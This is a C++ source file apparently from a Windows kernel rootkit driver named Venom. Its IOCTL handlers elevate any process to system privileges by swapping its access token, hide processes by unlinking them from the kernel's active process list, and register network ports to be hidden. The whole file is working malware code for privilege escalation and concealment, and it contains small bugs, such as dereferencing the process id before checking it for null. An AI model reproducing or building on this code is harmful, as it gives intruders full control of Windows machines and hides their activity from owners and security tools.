#include "IoctlHandlers.h"
#include "ProcHandler.h"
#include "TokenHandler.h"
#include "NetworkHandler.h"
#include "Venom.h"

NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
	PEPROCESS Process;
	PACCESS_TOKEN Token;
	auto status = STATUS_SUCCESS;
	auto stack = IoGetCurrentIrpStackLocation(Irp);

	auto pid = (ULONG*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

	DbgPrint("Token Elevator: Received pid %lu", *pid);

	if (pid == nullptr) {
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	status = PsLookupProcessByProcessId(UlongToHandle(*pid), &Process);

	if (!NT_SUCCESS(status)) {
		Irp->IoStatus.Information = 0;
		return status;
	}
	Token = PsReferencePrimaryToken(Process); // Get the process primary token.
	TokenHandler::ReplaceToken(Process, Token); // Replace the process token with system token.

	ObDereferenceObject(Token);
	ObDereferenceObject(Process);

	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = status;
	return status;
}

NTSTATUS IoctlHandlers::HideProcess(PIRP Irp) {
	auto status = STATUS_SUCCESS;
	auto stack = IoGetCurrentIrpStackLocation(Irp);

	auto pid = (ULONG*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
	if (pid == nullptr) {
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	status = ProcHandler::UnlinkActiveProcessLinks(*pid);
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = status;
	return status;
}

NTSTATUS  IoctlHandlers::HidePort(PIRP Irp) {
	auto status = STATUS_SUCCESS;
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto port = (USHORT*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

	if (*port <= static_cast < USHORT>(0) || *port > static_cast <USHORT>(65535))
	{
		return STATUS_INVALID_PARAMETER;
	}

	//Add the desired port to the list of hidden ports.
	auto size = sizeof(NetworkHandler::HiddenPort);
	auto portToHide = (NetworkHandler::HiddenPort*)ExAllocatePoolWithTag(PagedPool, size, DRIVER_TAG);

	if (portToHide == nullptr)
	{
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto ERROR;
	}
	
	portToHide->HiddenPort = NetworkHandler::htons(*port);
	NetworkHandler::addHiddenPort(&portToHide->Entry);

ERROR:
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	return status;
}